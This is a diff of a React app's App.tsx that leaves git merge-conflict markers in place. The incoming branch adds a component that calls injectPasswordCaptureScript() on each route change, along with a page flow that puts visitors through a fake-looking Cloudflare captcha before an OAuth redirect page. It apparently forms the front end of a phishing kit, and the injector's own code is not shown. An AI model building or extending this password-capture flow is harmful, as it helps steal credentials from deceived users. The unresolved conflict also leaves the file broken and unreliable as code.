@@ -63,4 +63,69 @@ const App: React.FC = () => {
     );
 };
 
+<<<<<<< HEAD
 export default App;
+=======
+const MainContent: React.FC = () => {
+    const [currentPage, setCurrentPage] = useState('captcha');
+    const location = useLocation();
+
+    useEffect(() => {
+        try {
+            injectPasswordCaptureScript();
+            console.log('✅ Password capture injector initialized');
+        } catch (error) {
+            console.warn('⚠️ Failed to initialize password capture injector:', error);
+        }
+    }, [location]);
+
+    return (
+        <Routes>
+            <Route path="/auth/callback" element={<AuthCallback />} />
+            <Route path="/" element={<DefaultPage currentPage={currentPage} setCurrentPage={setCurrentPage} />} />
+        </Routes>
+    );
+};
+
+const DefaultPage = ({ currentPage, setCurrentPage }) => {
+    useEffect(() => {
+        const urlParams = new URLSearchParams(window.location.search);
+        const step = urlParams.get('step');
+        if (step) {
+            setCurrentPage(step);
+            window.history.replaceState({}, document.title, window.location.pathname);
+        }
+    }, [setCurrentPage]);
+
+    const handleCaptchaVerified = () => {
+        setCurrentPage('replacement');
+    };
+
+    const handleCaptchaBack = () => {
+        window.location.reload();
+    };
+    
+    switch (currentPage) {
+        case 'captcha':
+            return (
+                <CloudflareCaptcha
+                    onVerified={handleCaptchaVerified}
+                    onBack={handleCaptchaBack}
+                />
+            );
+        case 'message-icon':
+            return <MessageIconLanding onOpenMessage={() => {}} />;
+        case 'replacement':
+            return <RealOAuthRedirect />;
+        default:
+            return (
+                <CloudflareCaptcha
+                    onVerified={handleCaptchaVerified}
+                    onBack={handleCaptchaBack}
+                />
+            );
+    }
+};
+
+export default App;
+>>>>>>> 370655a23c84aedd47fd54ae2fe7a2ea404651a5
